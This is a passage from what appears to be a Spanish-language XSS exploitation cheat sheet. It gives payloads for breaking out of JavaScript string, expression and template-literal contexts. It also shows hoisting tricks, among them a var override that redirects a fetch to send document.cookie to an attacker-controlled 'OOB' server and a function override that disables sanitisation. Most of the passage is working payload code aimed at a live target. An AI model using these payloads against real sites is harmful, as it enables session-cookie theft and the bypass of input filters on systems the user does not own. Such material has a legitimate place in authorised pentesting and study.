// Error: "canary9 is not defined"  → envolver en try/catch
";try{alert(1)}catch(e){}//

// Si el context es una expresión (no statement), usar operador coma:
",alert(1),"

// Si el payload tiene que ser una expresión válida que no lance error:
// usar void operator que acepta cualquier expresión y devuelve undefined
void(alert(1))

// Fix para cuando la variable antes del sink no existe:
// typeof no lanza ReferenceError (a diferencia de evaluación directa)
typeof nonExistentVar === 'undefined' && alert(1)
```

**Caso frecuente — string template sin cerrar:**
Si inyectás en un template literal `` var x = `INPUT` `` y el payload
contiene backticks, el template queda sin cerrar → SyntaxError. Fix:
cerrar el template antes del payload: `` `;alert(1)// ``.

## JS Hoisting — usar `var` y function hoisting como gadget

JS hoisting mueve las declaraciones `var` y `function` al top del scope
antes de la ejecución. Si podés inyectar una declaración `var` antes de que
el código legítimo use una variable del mismo nombre, la inicializás con un
valor controlado.

**Object Hoisting — pisar un objeto antes de su uso:**
```javascript
// Código legítimo del target (simplificado):
// config.apiEndpoint se usa para un fetch
// Si podés inyectar antes de esa línea:
var config = {apiEndpoint: 'https://OOB/?steal='+document.cookie};
// El código legítimo ahora usa tu config → fetch va a tu servidor
```

**Function Hoisting Override — pisar una función antes de su llamada:**
```javascript
// Target llama sanitize(input) para limpiar antes del sink
// Si podés inyectar una declaración antes:
function sanitize(x) { return x; }  // override: no sanitiza
// La función hoisted tuya reemplaza la original para ese scope
```

**Precondición:** el punto de inyección debe estar en el mismo scope (o
en un scope contenedor) que la variable/función que querés pisar, y la
inyección debe ocurrir antes de la inicialización en el orden textual
del script. Con `let`/`const` este truco no funciona (no se hostean de
la misma manera — dan ReferenceError si se acceden antes de la declaración).

**Cuándo aplica en la práctica:** template injection en SSR donde el servidor
genera un bloque `<script>` con variables de configuración, y hay un param
de usuario que se incluye en ese bloque antes de las variables de config.
Raro pero de alto impacto cuando aparece.

## Nota de vigencia
Categorías de fallo, no bypasses garantizados. Confirmar siempre en vivo
contra el filtro real del target.
